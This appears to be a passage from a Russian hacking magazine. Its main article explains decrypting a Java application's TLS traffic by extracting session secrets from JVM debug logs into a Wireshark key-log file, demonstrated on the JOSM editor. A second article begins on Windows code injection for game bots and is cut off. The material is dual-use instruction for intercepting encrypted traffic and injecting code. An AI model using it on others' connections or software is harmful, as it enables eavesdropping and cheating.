ssl            turn on ssl debugging

The following can be used with ssl:
    record       enable per-record tracing
    handshake    print each handshake message
    keygen       print key generation data
    session      print session activity
    defaultctx   print default SSL initialization
    sslctx       print SSLContext tracing
    sessioncache print session cache tracing
    keymanager   print key manager tracing
    trustmanager print trust manager tracing
    pluggability print pluggability tracing

    handshake debugging can be widened with:
    data         hex dump of each handshake message
    verbose      verbose handshake message printing

    record debugging can be widened with:
    plaintext    hex dump of record plaintext
    packet       print raw SSL/TLS packets

Что значит «can be used with ssl» и «can be widened»? Это значит, что значе-
ния могут быть составными, то есть включать в себя уточнения и/или пере-
числения, разделяемые знаками «:» или «,». Например, запись вида javax.net.
debug=ssl: record: plaintext говорит JVM, что мы хотим видеть отладочные
записи от SSL (включая TLS), причем с трассировкой по каждой записи (record)
в виде шестнадцатеричного дампа (plaintext) .
   Где именно мы увидим запрошенную информацию, зависит от того, куда
перенаправлен этот самый «стандартный вывод» у исследуемого приложения.
Для консольной программки ответ очевиден (консоль), для веб-приложения
под сервлет-контейнером Tomcat это файл %catalina_base%/logs/catalina.
out — словом, в каждом случае ответ может быть разным. Также не забывай,
что в стандартный вывод, скорее всего, попадут не только записи об SSL, но
и записи прикладной логики приложения; нужно быть готовым отсеивать одни
от других.
   Но давай ближе к делу. Запустив какую-нибудь программу с аргументом
javax.net.debug=ssl, ты увидишь в логах… много чего, но главное — это име-
на SSL-сообщений, которыми обмениваются клиент и сервер. Все они (прав-
да, не только они) начинаются с трех звездочек и выглядят примерно так:

*** ClientHello, TLSv1.2
...
*** ServerHello, TLSv1.2
...
*** ECDH ServerKeyExchange
...
*** ServerHelloDone
...
*** ECDHClientKeyExchange
...
*** Finished
...
*** Finished

Кстати, чтобы не путаться, давай условимся далее называть логами все, что
попадает в стандартный вывод приложения, а под протоколом SSL понимать
и протокол TLS (если не оговорено иное) .
   Состав сообщений и их роль могут меняться от версии протокола к версии.
Для нас же пока важно лишь просто уметь находить их в логах, а также знать,
что вместе эти сообщения составляют суть первого этапа SSL — рукопожатия
(handshake) .
   Другой, чуть менее важный элемент логов — это шестнадцатеричный дамп
SSL-записей. Чтобы он появился, в аргументе javax.net.debug должно при-
сутствовать значение data, например, javax.net.debug=ssl: handshake: data.
Найти его в логах можно по характерным (весьма объемным) фрагментам вида:

[read] MD5 and SHA1 hashes:  len = 333
0000: 0C 00 01 49 03 00 17 41   04 06 6B 77 1F BB F3 D3  ...I...A..kw....
0010: 8E DF F8 76 FF 9E 9F 9F   D8 E0 4A 5B CC 88 15 72  ...v......J[...r
0020: 01 6C 26 A5 2C EC 3C 5D   00 CF 64 8C 46 08 9D 18  .l&.,.<]..d.F...
0030: DF 44 7F DA AA 9E 0F BE   C4 9A 42 88 E5 EB F4 9C  .D........B.....
0040: 0C FB 60 0E 4C 9F B3 54   59 06 01 01 00 02 D8 96  ..`.L..TY.......
...

Этот элемент содержит «сырой» вывод предшествующего ему SSL-сообще-
ния (или нескольких). Строго говоря, без него можно попытаться обойтись, но
с ним решить нашу задачу будет несколько проще.
   Вот пока и все, что тебе пригодится знать об отладочных логах JVM. Теперь
давай посмотрим, что нам может дать сам протокол SSL.

РУКОПОЖАТИЕ В SSL: ПО ТУ СТОРОНУ ФОКУСА
В терминах протокола SSL этап начальных переговоров между клиентом и сер-
вером относится к т. н. рукопожатию (handshake), а его результатами являются:
1. Факт аутентификации сервера клиентом (а если требуется, то и наоборот);
2. Выбор параметров шифрования;
3. Материалы для получения сессионного ключа.
В контексте нашей задачи первый пункт этого выхлопа не интересен, а вот два
следующих давай рассмотрим чуть подробнее.

Выбор параметров шифрования. Сервер выбирает его из вариантов, пред-
лагаемых клиентом. Причем клиент предоставляет их в порядке своего пред-
почтения — чем раньше стоит набор параметров в списке вариантов, тем бо-
лее он предпочтителен клиентом. Наборы, кроме прочего, различаются числом
известных уязвимостей и стойкостью используемого шифра.
   При настройке SSL-контекста в Java-клиенте можно манипулировать спи-
ском поддерживаемых параметров и этим склонять сервер к менее стойкому
или более уязвимому шифру. Однако грамотно настроенный сервер, на кото-
ром админ позаботился об отключении таких дыр, ответит клиенту сообщени-
ем «Handshake failure», что в переводе с SSL-ского значит «Да пошёл ты!». От
того, что будет выбрано в этом пункте, существенно зависят…

Материалы для получения сессионного ключа. Прежде всего, давай уточ-
ним, что это такое и зачем оно нужно. Асимметричное шифрование — безуслов-
но, классное изобретение, ведь оно позволяет обмениваться шифрованными
сообщениями, не обмениваясь секретными ключами для их дешифрации. Од-
нако у него есть один слишком важный недостаток: его вычислительная трудо-
емкость настолько высока, что применение на больших объемах данных (осо-
бенно при жестких требованиях к скорости) становится неудобным или даже
невозможным.
   Другое дело — симметричное шифрование. Мало того, что сами по себе
его алгоритмы значительно быстрее, так алгоритм AES еще и имеет аппарат-
ную поддержку во многих современных процессорах. Но оно обладает как раз
тем недостатком, которого лишен асимметричный вариант: перед шифрова-
нием стороны должны каким-то образом обменяться одним единственным
секретным ключом шифрования. Именно поэтому решение, реализованное
в том числе в SSL, лежит где-то посередине — для быстрого поточного шиф-
рования данных используется симметричное шифрование, а для предшеству-
ющего ему получения секретного ключа — асимметричное шифрование.
   Слово «получение» в предыдущем предложении требует отдельного объ-
яснения. Дело в том, что появление ключа симметричного шифрования (в SSL
его принято называть сессионным ключом) можно обеспечить разными спо-
собами:

Схема 1. Способы
получения сессионного
ключа для симметричного
шифрования





Исторически первой свое применение нашла наиболее естественная идея:
«Пусть какая-нибудь сторона переговоров, например клиент, сгенерирует сес-
сионный ключ, а потом передаст его серверу, зашифровав его публичным клю-
чом сервера». Такой подход называют «методом обмена», а реализующий его
алгоритм — RSA (по аналогии с алгоритмом ассиметричного шифрования) .
   Этот метод долго и широко использовался в SSL и позднее в TLS (примени-
тельно к Java это версии до 1.6 включительно), но постепенно стал вытесняться
из-за одной важной особенности — если злоумышленнику удастся скомпро-
метировать секретный асимметричный ключ сервера, он сможет дешифро-
вать любые SSL-соединения этого сервера, как прошлые, так и будущие. Для
этого ему нужно лишь перехватить SSL-сообщение с сессионным ключом, за-
шифрованное публичным ключом сервера, и расшифровать его украденным
секретным ключом этого же сервера.
   Спустя время на сцену вышла отнюдь не новая, но чрезвычайно полезная
идея распространения ключей, предложенная Уитфилдом Диффи и Мартином
Хеллманом. Созданный ими алгоритм позволяет сгенерировать общий се-
кретный ключ, обмениваясь при этом лишь данными, не подверженными ком-
прометации, то есть бесполезными с точки зрения злоумышленника. Примеча-
тельно, что по сравнению с RSA в этом методе диалог сторон идет чуть дольше,
 т. к. в него вводится дополнительное SSL-сообщение ServerKeyExchange, в ко-
тором сервер передает клиенту свои публичные компоненты для генерации
общего ключа.
   Такой подход стали называть «методом генерации», а соответствующий ал-
горитм ожидаемо получил имя «алгоритм Диффи-Хеллмана» (DH). Поскольку
в этом методе секретный асимметричный ключ сервера больше не использу-
ется — его стало бессмысленно красть (разве что для других целей). Именно
этот метод на сегодня является умолчательным в большинстве современных
систем с защитой по SSL.

ДЕШИФРАЦИЯ ТРАФИКА В WIRESHARK: ЦИФРОВАЯ АЛХИМИЯ
Вот теперь, когда ты вооружен изложенными выше фактами, можно подсту-
питься к главному вопросу — как расшифровать перехваченный трафик?
   Первый вывод, который напрашивается из описания рукопожатия: каким бы
ни был протокол (SSL, либо TLS, любая версия), внутри него всегда работает
симметричное шифрование, а значит, заполучив его ключ (сессионный), мож-
но вообще не греть голову ассиметричной обвязкой. Отсюда же следствие:
коль скоро методов получения сессионного ключа два, то и подхода к его ком-
прометации, скорее всего, будет два, причем наверняка независимых.
   Все это хорошо, но кто нам даст сессионный ключ, если он мало того что
всякий раз генерируется новым где-то в дебрях клиента и сервера, так еще
и никогда не передается в явном виде по сети? К счастью, разработчики тоже
люди и им свойственно не только усложнять мир вокруг себя, но иногда и упро-
щать его. Яркий пример — некто Adam Langley, сотрудник Mozilla Foundation.
   Несколько лет назад Адам работал над библиотекой NSS (Network Socket
Security), которая используется в браузерах Firefox и Chrome для работы с SSL.
В своей работе для отладки SSL-соединений Адам активно использовал
Wireshark, предоставляя ему приватный ключ сервера для дешифрации тра-
фика. Однако с распространением TLS на основе алгоритмов DH такой под-
ход перестал работать, и Adam разработал новый.
   Адам снабдил библиотеку NSS возможностью логировать в специальный
файл некие данные, необходимые для деривации (получения) сессионных клю-
чей, а также инициировал доработку на стороне Wireshark, которая позволила
использовать этот файл для дешифрации трафика. Нехитрый формат этого
файла был опубликован на сайте Mozilla Foundation. Благодаря тому, что в нем
были учтены особенности как метода обмена, так и метода генерации, этот
подход стал применим как для старых систем на основе RSA, так и для более
новых на основе DH.
   К слову, благодаря этой доработке ты уже сейчас можешь расшифровать
трафик своего браузера, не обладая никаким специальным софтом, кроме
Wireshark.
   Но вернемся к нашей задаче. Взглянув на описание формата, ты без труда
заметишь, что он, по сути, состоит лишь из нескольких значений, участвующих
в рукопожатии. Или, более общими словами, из данных, на которых строится
защищенное соединение. Ничего не напоминает? Бинго! Это ведь часть тех
самых данных, которые выводит JVM, если в ее параметрах есть javax.net.
debug! А это значит, ты можешь сформировать файл в формате NSS самосто-
ятельно, опираясь только лишь на отладочные записи приложения.
   После этого останется лишь натравить Wireshark (с открытым в нем шифро-
ванным трафиком) на созданный файл, и готово — никакой SSL тебе больше
не помеха. Ну да хватит разглагольствовать, к делу!

ПРАКТИКА
Давай применим полученные знания на каком-нибудь безобидном, но реаль-
ном примере.

Замес
Прежде всего, нам понадобится «подопытный кролик» — какое-нибудь
Java-приложение с защищаемой сетевой активностью. К сожалению, го-
тового интернет-банка под рукой нет, поэтому возьмем что-нибудь попро-
ще — например, JOSM, свободно распространяемый редактор карт в форма-
те OpenStreetMap (OSM) с открытым исходным кодом. Это чистейшей воды
Java-приложение (причем версии 7+), позволяющее создавать и редактиро-
вать карты, которые затем становятся доступны на всех сайтах, приложениях и
устройствах, вовлеченных в проект OSM.


                                                           JOSM, редактор
                                                                карт в формате
                                                                 OpenStreetMap.
                                                    Наше подопытное
                                                             Java-приложение
                                                                    с защищаемой
                                                               сетевой активностью




Несмотря на то, что программу можно скачать и запустить как самостоятельное
десктопное приложение (в виде JAR архива, ссылка «Download josm-tested.jar»),
сетевой экран показывает, что она активно общается со своим back-end’ом на
сервере josm.openstreetmap.de, причем начиная с первых секунд работы. Что
именно отправляет она на сервер, какие данные получает от него — остается
только догадываться, если не уметь вскрывать ее трафик. Это мы и сделаем.
   Скачай себе JAR-архив программы, а также убедись, что на компьютере
установлена Java версии 7 или выше (JDK или JRE). Запускать программу не
торопись, вместо этого…
   Вспомним, что источниками данных при дешифрации для нас будут являть-
ся логи приложения и перехваченный Wireshark’ом трафик. Логи мы можем
себе обеспечить, оснастив вызов JAR-файла программы, во‑первых, опцией
включения SSL-отладки, во‑вторых, перенаправлением стандартного вывода
в файл josm-out.log (пока не запускай):

java -Djavax.net.debug=ssl: handshake: data
    -jar josm-tested.jar > josm-out.log

Теперь к трафику. Запусти Wireshark (нужна версия не ниже 1.6) и открой окно
опций захвата (Capture Options). Коль скоро мы заранее знаем, трафик к ка-
кому серверу мы хотим перехватить, давай укажем этот сервер в фильтре:





    Говорим Wireshark отображать трафик только для нашего сервера

Это позволит нам заблаговременно исключить множество ненужных пакетов,
пересылаемых другими процессами на твоей машине.
   Итак, теперь все готово. Можно начинать!

Эксперимент
Чтобы успеть перехватить первые же пакеты трафика от программы, сниффер,
очевидно, должен быть запущен заранее, поэтому стартуй его первым (кнопка
Start Capture). Благодаря включенному фильтру, журнал перехваченных паке-
тов должен пока оставаться пустым.
   Следующим шагом можно запускать исследуемую программу — стартуй
и ее, причем именно тем (длинным) вызовом, что был составлен чуть выше.
  JOSM потребуется несколько секунд на инициализацию, после которой
экран должен озариться основным окном программы:


                                                            Основное окно JOSM





Казалось бы, ты еще ничего не делал с программой, а в сниффере уже числят-
ся пакеты обмена данными с сервером:





   Пакеты обмена данными с сервером сразу же начинают отображаться в Wireshark





  … однако данные зашифрованы TLS 1.2


Все, что пока видно — это то, что обмен зашифрован, но он действительно
ведется с сервером josm.openstreetmap.de по протоколу TLSv1.2, а также
видны те самые SSL-сообщения, которые мы видели в логах Java-приложения,
когда разбирали назначение параметра javax.net.debug. Кстати, о логах. Не
пора ли заглянуть в них?
   К этому моменту указанный нами при запуске файл josm-out.log должен
быть уже не пустым. В этом легко убедиться, открыв его:

…
keyStore type is: jks
keyStore provider is:
init keystore
init keymanager of type SunX509
trustStore is: C:\Program Files\Java\jre1.8.0_45\lib\security\cacerts
trustStore type is: jks
trustStore provider is:
init truststore
adding as trusted cert:
…
%% No cached client session
*** ClientHello, TLSv1.2
RandomCookie: GMT: 1419259351 bytes = {169, 124, …, 176}
Session ID: {}
…
*** ServerHello, TLSv1.2
RandomCookie: GMT: 1847027039 bytes = {71, 90, …, 205}
Session ID: {128, 18, …, 184}
…
Image Fetcher 0, WRITE: TLSv1.2 Application Data, length = 264
Image Fetcher 0, READ: TLSv1.2 Application Data, length = 594
Image Fetcher 0, READ: TLSv1.2 Application Data, length = 1113
Image Fetcher 0, READ: TLSv1.2 Application Data, length = 26
Image Fetcher 0, READ: TLSv1.2 Application Data, length = 29

Как видишь, даже за эти считаные секунды наши «сита» забились массой вся-
кого «песка», как непонятного и бесполезного, так и ценного, но засекречен-
ного. Теперь давай аккуратно просеем его и извлечем золотые песчинки.


                             Продолжение статьи
Взлом


    Начало статьи



              РАСШИФРОВЫВАЕМ
                 TLS-ТРАФИК
              С ПОМОЩЬЮ JVMЛОГ
ВСЕМОГУЩИЙ




РАЗБОР

Заметка для ленивых

То, чем мы займемся на этом шаге, призвано, в первую очередь, помочь тебе
понять суть подхода к дешифрации с помощью логов. Это будет, по сути, руч-
ной труд, который едва ли годится для «промышленной эксплуатации». Если же
тебе не терпится просто получить результат, то воспользуйся утилиткой NSS
Java Maker, доступной на GitHub. Для простых (не загроможденных) логов она
автоматически выудит необходимые данные и скомпонует из них NSS-файл,
готовый для передачи в Wireshark. Синтаксис ее вызова довольно прост:

java -jar nssjavamaker.jar путь/к/логу/java-ssl-debug.log

Такой вызов создаст в текущей директории выходной файл session-keys.
nss. Если хочется на это повлиять или поиграться с другими опциями, загляни
в Readme.md.
  Схожую задачу, но без помощи логов (и, следовательно, с другими ограни-
чениями) также решает утилитка jSSLKeyLog.



Раз уж мы намереваемся самостоятельно создать NSS-файл, нужно понять,
какие данные в нем ожидает увидеть Wireshark. В описании формата сказа-
но, что файл является последовательностью строк, которые начинаются либо
с символа «#» (комментарий), либо с одного из двух идентификаторов:
•  RSA — в случае применения в рукопожатии метода обмена;
•  CLIENT_RANDOM — в случае метода генерации.

Наборы данных в строках в обоих случаях тоже разные. Значит, нам нужно по-
нять, какой метод применялся в нашем случае. Решений здесь аж несколько.

По названию согласованного сторонами шифра. Его видно и в сниффере:

                                                         Название
                                                             согласованного
                                                          сторонами шифра
                                                           в сниффере





   и в логах приложения:

*** ServerHello, TLSv1.2
RandomCookie: GMT: –1877660808 bytes = {156, 237, … 194, 255}
Session ID: {54, 28, … 168}
Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
Compression Method: 0
Extension renegotiation_info, renegotiated_connection: <empty>

Как видишь, в первой части этого наименования (до слова WITH) упоминается
аббревиатура DH, что указывает на использование алгоритма Диффи-Хелл-
мана в процессе получения сессионного ключа сторонами.

По наличию SSL-сообщения ServerKeyExchange. Если помнишь тео-
рию, алгоритм DH отличается от RSA, кроме прочего, наличием сообщения
ServerKeyExchange. В этом также можно убедиться по снифферу:

                                                      Сообщение
                                                            ServerKeyExchange
                                                           в сниффере





   и по логам приложения:

*** ECDH ServerKeyExchange
Signature Algorithm SHA512withRSA
Server key: Sun EC public key, 256 bits
    public x coord: 69600755423936…3823300815
    public y coord: 4879693016…41769238244142
    parameters: secp256r1 [NIST P-256, X9.62 prime256v1] …

Итак, теперь мы точно знаем, что в установленном нами соединении исполь-
зовался метод генерации. Значит, формируемая нами строка будет начинать-
ся с CLIENT_RANDOM.
   Что дальше? Согласно все тому же описанию, дальше следует 64 символа
шестнадцатеричного представления клиентского случайного значения. Это
число (по спецификации SSL) генерируется клиентом в самом начале рукопо-
жатия и передается серверу в первом же сообщении (ClientHello). Значит, его
должно быть видно в сниффере. Можешь проверить, так и есть:


                                                        Шестнадцатеричное
                                                          представление
                                                           клиентской рандомной
                                                            строки видно в снифере





Обрати внимание, что случайное значение включает в себя не только то, что
названо Random Bytes, но и предшествующее ему текущее время GMT Unix
Time.
   Поскольку для нас главным источником данных является лог приложе-
ния, надо найти аналогичное значение и в нем. Ориентируясь на сообщение
ClientHello, сделать это несложно:

*** ClientHello, TLSv1.2
RandomCookie: GMT: 1419238947 bytes = {49, 160, 56, 142, 249,
    126, 83, 58, 209, 191, 100, 144, 211, 134, 231, 115, 6, 38, 53,
    254, 190, 242, 131, 125, 95, 123, 67, 215}
Session ID: {}

Однако здесь это значение приведено отдельно от времени, да еще и деся-
теричными числами, а нам нужны шестнадцатеричные. Можно, конечно, за-
теяться и перевести. А можно положиться на подзначение: data параметра
javax.net.debug. Благодаря ему чуть ниже в лог выводится шестнадцатерич-
ный дамп всего сообщения, откуда искомое значение и можно выудить:

***
[write] MD5 and SHA1 hashes:  len = 249
0000: 01 00 00 F5 03 03 55 98   DE 23 31 A0 38 8E F9 7E  ......U..#1.8...
0010: 53 3A D1 BF 64 90 D3 86   E7 73 06 26 35 FE BE F2  S:..d....s.&5...
0020: 83 7D 5F 7B 43 D7 00 00   70 C0 24 C0 28 00 3D C0  .._.C...p.$.(.=.
0030: 26 C0 2A 00 6B 00 6A C0   0A C0 14 00 35 C0 05 C0  &.*.k.j.....5...
0040: 0F 00 39 00 38 C0 23 C0   27 00 3C C0 25 C0 29 00  ..9.8.#.'.<.%.).

Заметь, что случайное значение начинается не с начала дампа, а с седьмого
байта. Предыдущие шесть заняты параметрами сообщения ClientHello.
  После аккуратного сбора в одну строчку, удаления пробелов и приведения
к нижнему регистру у тебя должна получиться вот такая последовательность:

5598de2331a0388ef97e533ad1bf6490d386e773062635febef2837d5f7b43d7

Итого, у нас в распоряжении 32 байта клиентского случайного значения, ко-
торые за счет представления в шестнадцатеричной системе счисления дают
требуемые 64 символа для формируемого NSS-файла.

Примечание для буквоедов

Возможно, ты спросишь, чего ради в якобы секретный NSS-файл помещает-
ся никем не скрываемое значение CLIENT_RANDOM, видимое даже в нерас-
шифрованном перехваченном трафике? Это делается для того, чтобы Wireshark
мог правильно выбрать последующий за ним ключ MasterSecret в тех случа-
ях, когда и в трафике, и в NSS-файле содержится более одного соединения.
Другими словами, это значение служит для Wireshark’а уникальным индексом
в списке секретных ключей NSS-файла.



Идем дальше. Формат NSS предписывает нам поставить через пробел от слу-
чайного значения самое важное — главный секретный ключ MasterSecret
(точнее, 96 символов его шестнадцатеричного представления). Это еще не
сессионный ключ, но получить его, зная MasterSecret, для Wireshark’а уже не
составляет труда.
  И вот здесь своего зенита достигает идея использования отладочных за-
писей JVM. Только в них мы можем откопать это значение, ибо по сети оно, по
понятным причинам, никогда и ни в каком виде не передается, а значит, и в пе-
рехваченном трафике его искать бесполезно. А вот в логах найти его нетрудно,
вскоре за сообщением ClientKeyExchange:

*** ECDHClientKeyExchange
ECDH Public value: {4, 167, …, 244, 190}
[write] MD5 and SHA1 hashes: len = 70
...
Master Secret:
0000: AD 3D 48 A3 64 45 FB 55   21 92 44 5C CA CE 75 95  .=H.dE.U!.D\..u.
0010: 84 E6 95 79 E1 38 99 A1   39 92 C7 7D BE DE 62 CE  ...y.8..9.....b.
0020: 36 3A 18 36 4E 35 F9 A1   79 2A C7 0A 4D 0A 58 55  6:.6N5..y*..M.XU
Client write key:
...

Собрав эти значения в строку по аналогии с предыдущей, ты получишь вот та-
кую последовательность:

ad3d48a36445fb552192445ccace759584e69579e13899a13992c77
dbede62ce363a18364e35f9a1792ac70a4d0a5855

Отлично! Теперь у нас есть все три компонента строки NSS-файла, а значит,
можно собрать и его первый вариант. Вспомнив, что комментарии, предва-
ренные символом «#», вполне допустимы, ты можешь свести все накопленные
данные воедино согласно формату. Должно получиться примерно вот так:

# SSL/TLS secrets log file, created by me
CLIENT_RANDOM 5598de2331a0388ef97e533ad1bf6490d386e77
3062635febef2837d5f7b43d7  ad3d48a36445fb552192445ccace75
9584e69579e13899a13992c77dbede62ce363a18364e35f9a1792ac70a4d0a5855

Прелесть, не правда ли? Согласен, не правда. Ну да ладно; лишь бы Wireshark’у
понравилось.

Заметка для ретроградов

С методом генерации мы разобрались. А как быть, если в соединении при-
менялся метод обмена (RSA)? Подход аналогичен — берем соответствующий
формат строки NSS-файла и заполняем его. Отличия будет три.
   Во-первых, строка начнется с идентификатора RSA.
   Во-вторых, после нее последует не клиентское случайное значение, а пер-
вые 8 байт (16 символов) зашифрованного ключа PreMasterSecret. Его так
же можно извлечь либо из трафика в Wireshark’е, либо из шестнадцатеричного
дампа в логе (после SSL-сообщения ClientKeyExchange, см. ниже) .
   В-третьих, вместо MasterSecret в строку нужно прописать уже нешифро-
ванное значение PreMasterSecret (точнее, 96 символов его шестнадцатерич-
ного представления). Как и в случае с MasterSecret, откопать его можно только
в логе, так как по сети он в явном виде, очевидно, не передается:

*** ClientKeyExchange, RSA PreMasterSecret, TLSv1
[write] MD5 and SHA1 hashes:  len = 262
0000: 10 00 01 02 01 00 75 FF   86 6E 23 BE CA 1C DB EA  ......u..n#.....
0010: E9 80 0A 1C C9 CF 76 25   6F FE 75 82 4C 97 3E D6  ......v%o.u.L.>.
...
0100: 2B 32 C2 99 B6 C1                                  +2....
main, WRITE: TLSv1 Handshake, length = 262
SESSION KEYGEN:
PreMaster Secret:
0000: 03 01 2A ED E7 4B EF A8   82 33 25 3E 32 07 BB 13  ..*..K...3%>2...
0010: 20 93 5A B2 06 69 65 12   67 4D F5 C6 DE E7 DF AA   .Z..ie.gM......
0020: 21 56 93 2B C5 59 63 1C   8F 3B B4 6A E3 8A 71 FF  !V.+.Yc..;.j..q.
CONNECTION KEYGEN:

После того, как все эти отличия собраны воедино, строки NSS-файла будут
выглядеть примерно так:

# SSL/TLS secrets log file, generated by me
RSA 75ff866e23beca1c 03012aede74befa88233253e3207
bb1320935ab206696512674df5c6dee7dfaa2156932bc559631c8f3bb46ae38a71ff

Все это, кстати, умеет делать и утилита NSS Java Maker. Все дальнейшие шаги
для обоих методов аналогичны.



ВСКРЫТИЕ
Итак, у нас на операционном столе перехваченный в Wireshark трафик от JOSM,
а в руках — мегаинъекция в виде NSS-файла. Для ее применения кликни правой
кнопкой на любом SSL/TLS пакете трафика и выбери Protocol Preferences →
Secure Socket Layer Preferences… В открывшемся окне в поле (Pre)-Master-
Secret log filename укажи путь к сформированному NSS-файлу.





  Указываем путь к нашему NSS-файлу


Теперь жми ОК и дивись произошедшему. Если на предыдущих шагах не было
ошибок, то вид трафика должен стать иным (сравни с первым снимком трафи-
ка в Wireshark).





  Пакеты расшифрованы. Осталось собрать их воедино.


Что изменилось? Во-первых, свою темную суть внезапно обличили пакеты 11
и 22. Во-вторых, и это десерт сегодняшнего мероприятия, изменились пакеты,
которые раньше имели безликое название Application Data (14–18). Теперь
они стали вполне осязаемыми сегментами некого целостного потока данных.
Чтобы обозреть его целиком, вызови контекстное меню на любом из этих па-
кетов и выбери Follow SSL Stream.


                                                          Трафик
                                                          расшифрован, перед
                                                              тобой открытый GET-
                                                             запрос в читабельном
                                                                 виде. Бинго!





Теперь можешь почувствовать себя сотрудником АНБ — пред тобой ничем
более не прикрытый диалог клиента и сервера, изначально зашифрованный
одним из самых совершенных на сегодняшний день средств — протоколом
TLSv1.2.

TROUBLESHOOTING
В этом нетривиальном процессе есть тысяча и один момент, когда что-то мо-
жет пойти не так.
  Основной источник проблем (по опыту автора) — это сам Wireshark. Он
весьма чувствителен к содержимому NSS-файлов, поэтому первое, с чего
стоит начать разбор проблем, это проверить, нет ли отклонений от форма-
та NSS (в том числе лишних или недостающих пробелов). Правда, при этом
Wireshark же является и бесценным источником данных для выяснения причин
ошибок — он может вести лог обработки NSS-файла и в нем буквально гово-
рить, что идет не так.
   Чтобы включить этот лог, укажи все в том же окне настроек SSL путь к фай-
лу, в который он должен выводиться.





 Указываем путь в логу ошибок парсинга NSS

В этот лог могут попасть записи не только о работе с SSL, и Wireshark весьма
подробен в логировании, поэтому указывать этот файл лучше непосредствен-
но перед попыткой дешифрации трафика. Другие особенности работы с лога-
ми Wireshark ты можешь почерпнуть из работы Sally Vandeven’а (на английском,
приложение B) .
   Также не забывай, что для исключения человеческого фактора работу по
анализу логов приложения и составлению NSS-файла можно вообще пору-
чить утилите NSS Java Maker.

РАЗВЛЕКУШЕЧКИ (ФАКУЛЬТАТИВ)
Давай все же добьем тему и узнаем, какие данные летают между исследу-
емой программой и ее back-end’ом при запуске. Как не трудно заметить со
снимка окна Follow SSL Stream, клиент (JOSM) запрашивает у сервера josm.
openstreetmap.de некое изображение по адресу /browser/trunk/images/
download.png. Тот незамедлительно его возвращает (HTTP-заголовок Content-
Type: image/png). Тело ответа является двоичным представлением этого изо-
бражения.
   Чтобы посмотреть его само, сохрани диалог в какой-нибудь файл с расши-
рением png (кнопка Save As), затем открой текстовым редактором (только не
стандартным Блокнотом, лучше Notepad++) и удали из него все, что стоит пе-
ред строкой «.PNG» и после строки «0». Сохрани и теперь открой уже как изо-
бражение. Если к моменту прочтения тобою этих строк авторы JOSM ничего не
изменили, ты увидишь следующее.


      Иконка тулбара — вот что за зашифрованный трафик ходил
     между сервером и клиентом при старте приложения:)

Правильно, это та же самая иконка, которая красуется на кнопке «Скачать кар-
тографические данные с сервера OSM» внутри программы JOSM.


                                            Она самая!
                                                 Только зачем?





В чем смысл такого поведения — в проверке ли доступности сервера или в бо-
лее изощренной бизнес-логике — нам, видимо, не понять, да и незачем. Быть
может, несколько обидно провернуть такую работу, чтобы в конце получить ка-
кую-то бесполезную картинку. Но согласись, наивно было рассчитывать най-
ти вместо нее логины и пароли руководства Пентагона. Главное — ты освоил
принцип. Дальше — дело техники.

ВМЕСТО ЗАКЛЮЧЕНИЯ
В этой статье был рассмотрен еще один подход к дешифрации трафика при-
ложений на Java. В отличие от подходов, применявшихся ранее (дешифрация
приватным ключом сервера в Wireshark и поддельным сертификатом в Fiddler),
рассмотренный подход не зависит от метода деривации сессионного ключа
и не требует изменения настроек доверия у какой-либо из взаимодействую-
щих сторон.
   Рассмотренный подход относительно сложен в применении, что, однако,
может быть скомпенсировано использованием специальной автоматизирую-
щей утилиты NSS Java Maker. Надеюсь, он займет достойное место в твоем
арсенале средств взлома и отладки защищенных соединений.
Взлом
   УКОЛЬЧИК
   КОДА


                ИГРАЕМСЯ
            С CODE INJECTION
              ПОД WINDOWS





                                                 Литвиненко Аркадий
                                                         @BetepO_ok





Code Injection — процесс инъекции своего кода в память чужого приложения
с дальнейшим его выполнением. Вектор применения довольно широкий, на-
чиная от зловредов и заканчивая различными читами и ботами для игр. В част-
ном случае (который и будет рассмотрен в этой статье) мы можем выполнять
функции чужого приложения со своими параметрами. Подобная концепция
используется в игровых ботах.

ПРЕДИСЛОВИЕ
Допустим, у нас есть некий бот, который играет за нас в какую-нибудь игру.
От него требуется, помимо сбора игровых данных и принятия решений, еще
и производить какие-либо действия в игре. Допустим он решил, что ему требу-
ется атаковать противника. Его алгоритм действий может быть таким:
1. Найти уникальный идентификатор противника. (параметр idEnemy)
2. Принять решение, какой тип атаки использовать. (параметр typeAttack)
3. Произвести атаку с учетом идентификатора и типа атаки.

Последний шаг будет выглядеть в общем случае, как вызов функции:

attackEnemy (idEnemy, typeAttack);

По умолчанию игровой клиент никаких API возможностей для вызова своих
внутренних функций не предоставляет, поэтому единственным способом вы-
звать внутриигровую функцию как раз и является Code Injection.
   Думаю, не надо напоминать, что игровые клиенты защищены от подобных
вещей античитами и их обход — тема уже совершенно другой статьи =)


DLL Injection, DLL Hijacking и Code Injection

Хотя эти понятия довольно близкие, крайне важно понимать, чем они отлича-
ются:

1. DLL Hijacking — процесс подмены DLL у приложения. Сильно отличается
   от DLL/Code Injection, несмотря на схожесть названия. Суть заключается
   в том, что мы помещаем вредоносные DLL рядом с программой: если при-
   ложение уязвимо, оно подгрузит вредоносные DLL вместо оригинальных.
2. Code Injection — процесс инъекции кода в память процесса, с целью его
   дальнейшего выполнения.
3. DLL Injection — процесс подгрузки своей DLL в память процесса. На прак-
   тике проще, чем Code Injection и используется значительно чаще. Но быва-
   ют частные случаи, когда приходится использовать Code Injection вместо
  DLL Injection. Поэтому лучше знать обе техники. =)



НЕОБХОДИМЫЙ МИНИМУМ ЗНАНИЙ
Основным мастхэвом является знание языка Си (поскольку это основной язык,
используемый в этой статье). Также требуется наличие некоего представления
об WinApi, x86 ассемблере и базовые навыки в дебаге с помощью OllyDBG (или
любого другого Windows отладчика) .

ПИШЕМ ПОДОПЫТНОГО
Программа очень примитивна. При нажатие Enter она просто выдаёт содержи-
мое буфера на экран. Содержимое буфера жестко прописано в памяти и ни-
где не меняется.

#include <stdio.h>
void PrintMessage (char *buffer);
void main ()
{
    char *buffer = "default message";
    while (true)
    {
        getchar ();
        PrintMessage (buffer);
    }
}
void PrintMessage (char *buffer)
{
    printf ("%s", buffer);
}

                                                                      Рис. 1. Программа
                                                                                test.exe





ОТЛАЖИВАЕМ ПРОГРАММУ
Теперь нам нужно найти интересующие нас адреса и функции. Использовать
будем обычный OllyDbg (или любой другой отладчик). Наиболее интересная
для нас функция — PrintMessage. Способов её найти в отладчике масса, при-
веду самый простой: запускаем программу в отладчике, зажимаем Step Over
(F8), в этот момент отладчик начинает бодро бегать по инструкциям. Когда он
остановится на каком-то CALL или JMP, проваливаемся в них (Enter) и сразу
ставим breakpoint (F2). После этого перезапускаем отладку (Ctrl + F2) и снова
